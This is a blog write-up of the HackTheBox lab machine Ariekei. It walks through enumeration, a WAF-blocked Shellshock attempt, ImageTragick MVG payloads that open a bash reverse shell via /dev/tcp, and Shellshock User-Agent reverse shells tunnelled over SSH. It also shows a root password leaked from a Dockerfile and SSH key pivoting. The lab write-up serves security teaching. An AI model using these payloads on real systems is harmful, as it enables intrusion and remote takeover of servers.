---
title: HTB: Ariekei
url: https://0xdf.gitlab.io/2022/04/20/htb-ariekei.html
date: 2022-04-20T09:00:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, hackthebox, htb-ariekei, nmap, vhosts, wfuzz, youtube, waf, feroxbuster, cgi, shellshock, cve-2014-6271, image-tragick, image-magick, cve-2016-3714, docker, pivot, password-reuse, tunnel, ssh2john, hashcat, htb-shocker
---

![Ariekei](https://0xdfimages.gitlab.io/img/ariekei-cover.png)

Ariekei is an insane-rated machine released on HackTheBox in 2017, focused around two very well known vulnerabilities, Shellshock and Image Tragic. I’ll find Shellshock very quickly, but not be able to exploit it due to a web application firewall. I’ll turn to another virtual host where there’s an image upload, and exploit Image Tragic to get a shell in a Docker container. I’ll use what I can enumerate about the network of docker containers and their secrets to to pivot to a new container that can talk directly to the website that’s vulnerable to Shellshock without the WAF, and exploit it to get access there. After escalating, I’ll find an SSH key that provides access to the host, and abuse the docker group to escalate to root.

## Box Info

| Name | [Ariekei](https://hackthebox.com/machines/ariekei)  [Ariekei](https://hackthebox.com/machines/ariekei) [Play on HackTheBox](https://hackthebox.com/machines/ariekei) |
| --- | --- |
| Release Date | [18 Nov 2017](https://twitter.com/hackthebox_eu/status/931118912233754624) |
| Retire Date | 21 Apr 2018 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Ariekei |
| Radar Graph | Radar chart for Ariekei |
| First Blood User | 22:07:59[overcast overcast](https://app.hackthebox.com/users/9682) |
| First Blood Root | 23:13:49[overcast overcast](https://app.hackthebox.com/users/9682) |
| Creator | [rotarydrone rotarydrone](https://app.hackthebox.com/users/3067) |

## Recon

### nmap

`nmap` finds three open TCP ports, two SSH (22, 1022) and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.65
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-14 00:39 UTC
Nmap scan report for 10.10.10.65
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
1022/tcp open  exp2

Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
oxdf@hacky$ nmap -p 22,443,1022 -sCV -oA scans/nmap-tcpscripts 10.10.10.65
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-14 00:40 UTC
Nmap scan report for 10.10.10.65
Host is up (0.091s latency).

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
|_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
443/tcp  open  ssl/https nginx/1.10.2
|_http-server-header: nginx/1.10.2
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
1022/tcp open  ssh       OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
|_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.97 seconds

```

The two [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions are different. Port 22 is the version that comes on Ubuntu 16.04 xenial, while the port 1022 version is what comes with Ubuntu 14.04 trusty. This implies perhaps containers in use.

### Virtual Hosts

#### TLS Certificate

Looking at the TLS certificate, it shows the name Ariekei, as well as two alternative names, `calvin.ariekei.htb` and `beehive.ariekei.htb`:

![image-20220413204906954](https://0xdfimages.gitlab.io/img/image-20220413204906954.png)

#### Fuzz

Given the use of virtual host routing, I’ll use `wfuzz` to look for others. I’ll start the scan and notice that the default case is 487 characters, so I’ll kill it and add `--hh 487` to the arguments and start it again. It doesn’t find anything new:

```

oxdf@hacky$ wfuzz -u https://10.10.10.65 -H "Host: FUZZ.ariekei.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil
lion-20000.txt --hh 487
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.65/
Total requests: 19966

===================================================================
ID           Response   Lines    Word     Chars       Payload

===================================================================

000002730:   404        4 L      34 W     233 Ch      "calvin"

Total time: 198.4872
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 100.5908

```

I did find it interesting that `beehive` didn’t show up. A really quick [video](https://www.youtube.com/watch?v=RVmnR_HccL8) explaining how I poked at that a bit more:

The conclusion is that `beehive` is the same as the default case for the site, *except* is it missing a header, and headers are not included in the various length fields for `wfuzz`, so it considers `behive` the same as the default case, and it gets filtered out.

I’ll add the domain and two subdomains to `/etc/hosts` on my VM:

```
10.10.10.65 ariekie.htb beehive.ariekie.htb calvin.ariekie.htb

```

### beehive - TCP 443

#### Site

The site just says it’s under development:

![image-20220418174312964](https://0xdfimages.gitlab.io/img/image-20220418174312964.png)

The HTML is quite simple:

```

<!doctype html>
<title>Site Maintenance</title>
<style>
  body { text-align: center; padding: 150px; }
  h1 { font-size: 50px; }
  body { font: 20px Helvetica, sans-serif; color: #333; }
  article { display: block; text-align: left; width: 650px; margin: 0 auto; }
  a { color: #dc8100; text-decoration: none; }
  a:hover { color: #333; text-decoration: none; }
</style>

<article>
    <h1>Maintainence! </h1>
    <div>
    <p> This site is under development </p>
    </div>
</article>

```

#### Tech Stack

The HTTP headers show the NGINX version:

```

HTTP/1.1 200 OK
Server: nginx/1.10.2
Date: Mon, 18 Apr 2022 21:44:39 GMT
Content-Type: text/html
Content-Length: 487
Connection: close
Last-Modified: Sat, 16 Sep 2017 00:46:12 GMT
ETag: "1923e-1e7-55943d606bd00"
Vary: Accept-Encoding
X-Ariekei-WAF: beehive.ariekei.htb
Accept-Ranges: bytes

```

The `X-Ariekei-WAF` header is added to the response, which seems to suggest there’s a web application firewall (WAF) looking at this traffic.

Guessing at extensions, `index.php` doesn’t load anything, but `index.html` does, which doesn’t give any information about what the site may be built on (probably not Ruby or Python framework, but that was unlikely in these older boxes anyway).

#### Directory Brute Force

`feroxbuster` finds two new paths:

```

oxdf@hacky$ feroxbuster -u https://beehive.ariekei.htb -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://beehive.ariekei.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      325c https://beehive.ariekei.htb/blog => http://beehive.ariekei.htb/blog/
403      GET       10l       30w      300c https://beehive.ariekei.htb/server-status
[####################] - 1m     29999/29999   0s      found:2       errors:0      
[####################] - 1m     29999/29999   496/s   https://beehive.ariekei.htb 

```

`server-status` is an Apache thing, which suggests that NGINX is proxying for Apache. Given that I already suspect containers, perhaps Apache is in a container and NGINX is on the host (just a guess at this point).

I’ll want to check out `/blog`.

In an effort to always keep enumeration going in the background, one trick that’s worth considering if I haven’t found the path yet is to re-run `feroxbuster` with `-f`. This will append `/` to each item before sending it. The default behavior for many webservers on visiting the url without the trailing `/` is to 301 to that same path with it, but there are cases where that doesn’t happen. I’ll also show with `-d 1` because otherwise it dumps a *ton* of junk onto the screen when stepping into various directories:

```

oxdf@hacky$ feroxbuster -u https://beehive.ariekei.htb -k -f -d 1

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://beehive.ariekei.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🪓  Add Slash             │ true
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w      295c https://beehive.ariekei.htb/cgi-bin/
200      GET      183l      465w     6454c https://beehive.ariekei.htb/blog/
403      GET       10l       30w      293c https://beehive.ariekei.htb/icons/
403      GET       10l       30w      301c https://beehive.ariekei.htb/server-status/
[####################] - 1m     29999/29999   0s      found:4       errors:0      
[####################] - 1m     29999/29999   491/s   https://beehive.ariekei.htb 

```

There’s a single path inside `cgi-bin`, `stats`:

```

oxdf@hacky$ feroxbuster -u https://beehive.ariekei.htb/cgi-bin -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://beehive.ariekei.htb/cgi-bin
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       35l      100w        0c https://beehive.ariekei.htb/cgi-bin/stats
[####################] - 1m     29999/29999   0s      found:1       errors:0      
[####################] - 1m     29999/29999   496/s   https://beehive.ariekei.htb/cgi-bin

```

#### blog

`/blog` has a blog:

[![image-20220418175502070](https://0xdfimages.gitlab.io/img/image-20220418175502070.png)](https://0xdfimages.gitlab.io/img/image-20220418175502070.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220418175502070.png)

It’s entirely filled with [lorum ipsum text](https://en.wikipedia.org/wiki/Lorem_ipsum) (in fact, at the end of each post, it says it was generated with [Space Ipsum](https://spaceipsum.com/)).

The “Contact” link does have a form:

[![image-20220418175627406](https://0xdfimages.gitlab.io/img/image-20220418175627406.png)](https://0xdfimages.gitlab.io/img/image-20220418175627406.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220418175627406.png)

Submitting to this form sends a POST to `/blog/mail/contact_me.php`, which returns the source for that page:

```

HTTP/1.1 200 OK
Server: nginx/1.10.2
Date: Tue, 19 Apr 2022 21:20:06 GMT
Content-Length: 1242
Connection: close
Last-Modified: Sat, 16 Sep 2017 00:38:30 GMT
ETag: "192c7-4da-55943ba7d2d80"
X-Ariekei-WAF: beehive.ariekei.htb
Accept-Ranges: bytes

<?php
// Check for empty fields
if(empty($_POST['name'])      ||
   empty($_POST['email'])     ||
   empty($_POST['phone'])     ||
   empty($_POST['message'])   ||
   !filter_var($_POST['email'],FILTER_VALIDATE_EMAIL))
   {
   echo "No arguments Provided!";
   return false;
   }
   
$name = strip_tags(htmlspecialchars($_POST['name']));
...[snip]...

```

I think this comes with the template, but that PHP isn’t enabled on the server, so it’s returning it as a static page. Because it’s a 200 response, the JavaScript making the submission displays:

![image-20220419172528166](https://0xdfimages.gitlab.io/img/image-20220419172528166.png)

If I add any special characters into the submission, it returns 403 Forbidden (as shown here in Burp):

[![image-20220418175818715](https://0xdfimages.gitlab.io/img/image-20220418175818715.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220418175818715.png)

This request is sent in the background with JavaScript, and the 403 is handled by displaying this error message:

![image-20220418175844513](https://0xdfimages.gitlab.io/img/image-20220418175844513.png)

#### /cgi-bin/stats

This page returns what looks like a dump of commands like `date`, `uptime`, `bash --version`, as well as the current environment variables:

![image-20220419070352297](https://0xdfimages.gitlab.io/img/image-20220419070352297.png)

This Bash version, 4.2.37, *should* be vulnerable to [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)).

### calvin - TCP 443

#### Site

The page just returns 404:

![image-20220419070448183](https://0xdfimages.gitlab.io/img/image-20220419070448183.png)

#### Tech Stack

Same as above, but no WAF header on `/`. It actually turns out that on other pages (like `/upload` discovered in the next section), it adds one specific to calvin:

```

HTTP/1.1 200 OK
Server: nginx/1.10.2
Date: Tue, 19 Apr 2022 11:06:28 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1656
Connection: close
X-Ariekei-WAF: calvin.ariekei.htb
Accept-Ranges: bytes

```

Given the 404 on the index, nothing to check for `index.extension`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds `/upload`:

```

oxdf@hacky$ feroxbuster -u https://calvin.ariekei.htb/ -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://calvin.ariekei.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       35l      141w     1656c https://calvin.ariekei.htb/upload
[####################] - 1m     29999/29999   0s      found:1       errors:0      
[####################] - 1m     29999/29999   325/s   https://calvin.ariekei.htb/ 

```

With `-f` it finds nothing.

#### /upload

The page is to upload images:

![image-20220419070648165](https://0xdfimages.gitlab.io/img/image-20220419070648165.png)

The page title is “Image Converter”. When I select a legit PNG and click “Upload”, it sends a POST to `/upload`, which returns a redirect back to `/upload` as a GET request.

There’s no indication of where the upload may be stored, or if I can reach it remotely.

There is a hint in the HTML source for the page:

![image-20220419124756358](https://0xdfimages.gitlab.io/img/image-20220419124756358.png)

That ASCII art is the [comedy and tragedy masks](https://www.onstageblog.com/editorials/comedy-and-tragedy-masks-of-theatre).

### Failed Shellshock / WAF Enumeration

#### Background

[Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), also known as CVE-2014-6271, Bashbug, Bashdoor, and other thing, was made public in September 2014. It was introduced into Bash in version 1.03 on 1 September 1989. The vulnerability is in the “function export” feature and how things are stored in environment variables. The big issue with Shellshock was not just that it was in bash, but the high number of ways that people kept finding to pass an attack string to a server that would end up down this vulnerable bash code path. Any time that

The most common POC for Shellshock was something like:

```

env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

```

A really common example was with CGI-based web servers, where things like the User Agent string are parsed into environment variables, and thus hit the vulnerable code.

#### Initial Failure

I first showed Shellshock on the [Shocker](/2021/05/25/htb-shocker.html#shell-as-shelly) box. I’ll need an `echo` as the first command (long story on that in [Shocker Beyond Root](/2021/05/25/htb-shocker.html#shellshock-chained-commands)). Putting this all together, I’ll send a `User-Agent` header of `() { :;}; echo; /usr/bin/id`. It returns 403 Forbidden:

![image-20220419152800731](https://0xdfimages.gitlab.io/img/image-20220419152800731.png)

The response actually has ASCII art of a face taunting me:

![image-20220419152851630](https://0xdfimages.gitlab.io/img/image-20220419152851630.png)

#### Enumerating WAF

WAF rules often are looking for specific strings and/or characters. I’ll start deleting characters from the `User-Agent` until it no longer returns 403. At `() {` it is still triggered, but removing the `{` clears the request.

It seems that `() {` (four characters, including the space before the `{`) is what triggers the WAF. Unfortunately, that’s also required for the payload to work.

URL-encoding doesn’t help (even encoding every character).

I wasn’t able to get past this WAF and exploit Shellshock.

## Shell as root on calvin

### ImageTragick Background

[ImageTragick](https://imagetragick.com/) was a 2016 bug in ImageMagick, the most common Linux command-line package for modifying and processing images.

There are several CVEs associated with the name, but the most interesting one, CVE-2016-3714, is a command injection vulnerability in how ImageMagick parses formats like MVG and SVG.

The site gives an example `.mvg` file of:

```

push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context

```

### ImageTragic POC (ping)

I’ll create `ping.mvg`:

```

push graphic-context
viewbox 0 0 640 480
fill 'url(https://1.1.1.1/0xdf.jpg"|ping -c 1 10.10.14.6;echo "yay)'
pop graphic-context

```

The command injection happens by closing off the previous command with a `"`, so it’s important to balance it out with a closing `"`.

I’ll start `tcpdump` and upload this file. ICMP arrives at my host:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:38:13.724950 IP 10.10.10.65 > 10.10.14.6: ICMP echo request, id 15, seq 1, length 64
16:38:13.725024 IP 10.10.14.6 > 10.10.10.65: ICMP echo reply, id 15, seq 1, length 64

```

That’s code execution.

### Shell

I’ll convert that payload into a reverse shell using a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

push graphic-context
viewbox 0 0 640 480
fill 'url(https://1.1.1.1/0xdf.jpg"|bash -i >& /dev/tcp/10.10.14.6/443 0>&1;echo "yay)'
pop graphic-context

```

I’ll start `nc` listening on 443 and upload that new payload, and a shell returns:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.65 45906
[root@calvin app]# 

```

I’ll upgrade my shell using `script` / `stty`:

```

[root@calvin app]# script /dev/null -c bash
script /dev/null -c bash
[root@calvin app]# ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
                                                                         
Erase set to delete.
Kill set to control-U (^U).
Interrupt set to control-C (^C).
[root@calvin app]#

```

## Shell as root on bastion

### Enumeration

#### Docker

Given the initial shell as root, and the hostname calvin, it’s likely that I’m running in a container. Looking at the filesystem room confirms it by the presence of `.dockerenv`:

```

[root@calvin /]# ls -a 
.           anaconda-post.log  common  home   lost+found  opt   run   sys  var
..          app                dev     lib    media       proc  sbin  tmp
.dockerenv  bin                etc     lib64  mnt         root  srv   usr

```

The container doesn’t have `ifconfig` or `ip`:

```

[root@calvin /]# ifconfig
bash: ifconfig: command not found
[root@calvin /]# ip addr
bash: ip: command not found

```

Looking in `/proc/net/fib_trie` shows the IP is 172.23.0.11.

#### /common

`/common` is mounted into the file system:

```

[root@calvin network]# mount | grep common
/dev/mapper/ariekei--vg-root on /common type ext4 (ro,relatime,errors=remount-ro,data=ordered)

```

This is likely on the host and mounted in with Docker. In `/common`, there’s three directories:

```

[root@calvin common]# ls -a
.  ..  .secrets  containers  network

```

#### network

`network` has a `make_nets.sh` file, which shows two subnets:

```

#!/bin/bash

# Create isolated network for building containers. No internet access
docker network create -d bridge --subnet=172.24.0.0/24 --gateway=172.24.0.1 --ip-range=172.24.0.0/24 \
 -o com.docker.network.bridge.enable_ip_masquerade=false \
  arieka-test-net

# Create network for live containers. Internet access
docker network create -d bridge --subnet=172.23.0.0/24 --gateway=172.23.0.1 --ip-range=172.23.0.0/24 \
 arieka-live-net

```

There’s also an `info.png`. `nc` isn’t on the host, but I’ll send it back over `bash` redirection:

```

[root@calvin network]# cat info.png > /dev/tcp/10.10.14.6/443

```

The file won’t open as a PNG, because it’s actually a Web/P image:

```

oxdf@hacky$ file info.png
info.png: RIFF (little-endian) data, Web/P image 

```

I’ll rename it, and then use `convert` to create a PNG:

```

oxdf@hacky$ mv info.png info.webp
oxdf@hacky$ convert info.webp info.png

```

![](https://0xdfimages.gitlab.io/img/info.png)

It shows the host and four containers. There’s a bastion-live host, which has SSH forwarded from the host’s port 1022, and lives on both networks. The WAF also lives on both networks. covert-live is the calvin box I’m on right now, and blog-test is the beehive box.

I could spend time mapping out the network, but from what I can see here, it seems that this container will be limited to the 172.23.0.0/24 network.

#### containers

`containers` has folders for each container:

```

[root@calvin containers]# ls
bastion-live  blog-test  convert-live  waf-live

```

Each contains the `Dockerfile` and the other scripts to build/run the container. For example, `bastion-live`:

```

[root@calvin containers]# ls bastion-live/
Dockerfile  build.sh  sshd_config  start.sh

```

The `Dockerfile` from `blog-test` happens to have the root creds in it:

```

FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update 
RUN apt-get install python -y
RUN mkdir /common 

```

I’ll make a note of that. The same password is in the `Dockerfile` for `bastion-live`.

The `waf-live` folder has a lot of files for the WAF:

```

[root@calvin waf-live]# ls
Dockerfile         build-docker.sh  license.txt           pages
Dockerfile.multi   build.multi.sh   logs                  readme.md
Dockerfile.single  build.sh         modsec_includes.conf  ssl.crt
ariekei.config     config.multi.sh  modsecurity.conf      ssl.key
ariekei.csr        crs-setup.conf   nginx.conf            start.sh

```

`nginx.conf` has the site setup, including the `server` definitions for `calvin.ariekei.htb` and `beehive.ariekei.htb`:

```

...[snip]...
    server {
        listen       443 ssl;
        server_name  beehive.ariekei.htb;

        location / {
                proxy_pass http://172.24.0.2/;
                proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
                proxy_redirect off;
                proxy_buffering off;
                proxy_force_ranges on;
                proxy_set_header        Host            $host;
                proxy_set_header        X-Real-IP       $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                add_header X-Ariekei-WAF "beehive.ariekei.htb";

        }

        error_page 403 /403.html;
        location = /403.html {
            root   html;
        }

    }

    server {
        listen 443 ssl; 
        server_name calvin.ariekei.htb;
#       return 301 https://calvin.ariekei.htb$request_uri;
        location / {
                proxy_pass http://172.23.0.11:8080;
                proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
                proxy_redirect off;
                proxy_buffering off;
                proxy_force_ranges on;
                proxy_set_header        Host            $host;
                proxy_set_header        X-Real-IP       $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                add_header X-Ariekei-WAF "calvin.ariekei.htb";

        }
        
        error_page 403 /403.html;
        location = /403.html {
            root   html;
        }
...[snip]...

```

One tiny note - the image shows calvin as listening on 80 and beehive as listening on 8080. This config shows the opposite. I’ll be aware that one is wrong.

#### .secrets

`.secrets` has a public/private key pair:

```

[root@calvin .secrets]# ls
bastion_key  bastion_key.pub

```

The public key ends with `root@arieka`, which gives the username likely associated with it.

### SSH

I’ll copy the private key back to my VM and it works to connect to the bastion host:

```

oxdf@hacky$ vim ~/keys/ariekei-bastion-root
oxdf@hacky$ chmod 600 ~/keys/ariekei-bastion-root
oxdf@hacky$ ssh root@10.10.10.65 -p 1022 -i ~/keys/ariekei-bastion-root
Warning: Permanently added '[10.10.10.65]:1022' (ECDSA) to the list of known hosts.
Last login: Mon Nov 13 15:20:19 2017 from 10.10.14.2
root@ezra:~# 

```

## Shell as www-data on blog-test

### Enumeration

There’s not too much on bastion. `/common` is mapped in just like on the previous host. There’s no directories in `/home`, and `/root` is basically empty

From here, I can talk to blog-test:

```

root@ezra:~# ping 172.24.0.1
PING 172.24.0.1 (172.24.0.1) 56(84) bytes of data.
64 bytes from 172.24.0.1: icmp_seq=1 ttl=64 time=0.108 ms
64 bytes from 172.24.0.1: icmp_seq=2 ttl=64 time=0.081 ms
^C

```

The diagram and the configs from `/common` were contradictory as to what port the webserver on blog-test is listening on. `curl` isn’t on the box, but `wget` is, and that’s enough to show it’s 80:

```

root@ezra:~# wget 172.24.0.2:8080
--2022-04-19 19:34:28--  http://172.24.0.2:8080/
Connecting to 172.24.0.2:8080... failed: Connection refused.
root@ezra:~# wget 172.24.0.2:80  
--2022-04-19 19:34:44--  http://172.24.0.2/
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 487 [text/html]
Saving to: 'index.html'

100%[========================================================>] 487         --.-K/s   in 0s      

2022-04-19 19:34:44 (61.7 MB/s) - 'index.html' saved [487/487]

```

I’m able to directly hit `/cgi-bin/stats`:

```

root@ezra:~# wget -O- http://172.24.0.2/cgi-bin/stats
--2022-04-19 19:39:08--  http://172.24.0.2/cgi-bin/stats
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'STDOUT'

    [<=>                                                          ] 0           --.-K/s              <pre>
Tue Apr 19 19:39:08 UTC 2022
19:39:08 up 6:44, 0 users, load average: 0.00, 0.00, 0.00
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
Environment Variables:
<pre>
SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at 172.24.0.2 Port 80</address>

HTTP_USER_AGENT=Wget/1.15 (linux-gnu)
SERVER_PORT=80
...[snip]...

```

### Shellshock

#### POC

Because I can now talk directly to beehive, I suspect I can avoid the WAF. I’ll try the same payload as before, setting the `User-Agent` with `-U` in `wget`, and it works:

```

root@ezra:~# wget -U '() { :;}; echo; /usr/bin/id' -O- http://172.24.0.2/cgi-bin/stats
--2022-04-19 19:40:57--  http://172.24.0.2/cgi-bin/stats
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified
Saving to: 'STDOUT'

    [<=>                                                          ] 0           --.-K/s              uid=33(www-data) gid=33(www-data) groups=33(www-data)
    [ <=>                                                         ] 54          --.-K/s   in 0s      

2022-04-19 19:40:57 (3.99 MB/s) - written to stdout [54]

```

#### Rev Shell Fail

The diagram said that beehive didn’t have internet, which I’ll guess means it can’t connect back to my VM. Still it’s worth a try. I’ll update the `User-Agent` to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw), and run. It hangs, but there’s no connection at my waiting `nc`:

```

root@ezra:~# wget -U '() { :;}; echo; /usr/bin/bash >& /dev/tcp/10.10.14.6/443 0>&1' -O- http://172.24.0.2/cgi-bin/stats
--2022-04-19 19:42:09--  http://172.24.0.2/cgi-bin/stats
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 

```

This is indicative of a connection that can’t get out.

#### Tunnel Rev Shell

I’ll reconnect to SSH using `-R 4443:10.10.14.6:443`. This will start a listening socket on 4443 on bastion, and anything that hits that socket will be forwarded via the SSH tunnel to my VM on port 443.

I’ll start `nc` listening on 443, and send a Shellshock that has the reverse shell connect to 172.24.0.253 on 4443:

```

root@ezra:~# wget -U '() { :;}; echo; /bin/bash >& /dev/tcp/172.24.0.253/4443 0>&1' -O- http://172.24.0.2/cgi-bin/stats
--2022-04-19 19:52:57--  http://172.24.0.2/cgi-bin/stats
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 

```

It hangs, but there’s a connection at my VM:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.14.6 39420

```

There’s no prompt, but I can run commands:

```

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Doing the shell upgrade also provides the prompt:

```

script /dev/null -c bash
www-data@beehive:/usr/lib/cgi-bin$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset: unknown terminal type unknown
Terminal type? screen
                                                                         
Erase set to delete.
Kill set to control-U (^U).
Interrupt set to control-C (^C).
www-data@beehive:/usr/lib/cgi-bin$

```

## Shell as root on blog-test

I noted the `Dockerfile` with the root password during enumeration of the `/common` directory. That password works for root here:

```

www-data@beehive:/usr/lib/cgi-bin$ su -
Password: 
root@beehive:~# 

```

This will only work once I’ve upgraded to a full PTY.

`user.txt` is in `/home/spanishdancer`:

```

root@beehive:~# cat /home/spanishdancer/user.txt
8e6c8595************************

```

## Shell as spanishdancer on Ariekei

### Enumeration

`/home/spanishdancer` is also mounted into the container:

```

root@beehive:~# mount  | grep home
/dev/mapper/ariekei--vg-root on /home/spanishdancer type ext4 (ro,relatime,errors=remount-ro,data=ordered)

```

This is likely a folder on the host that’s mapped in.

There’s an SSH key pair in `/home/spanishdancer/.ssh`:

```

root@beehive:/home/spanishdancer/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub

```

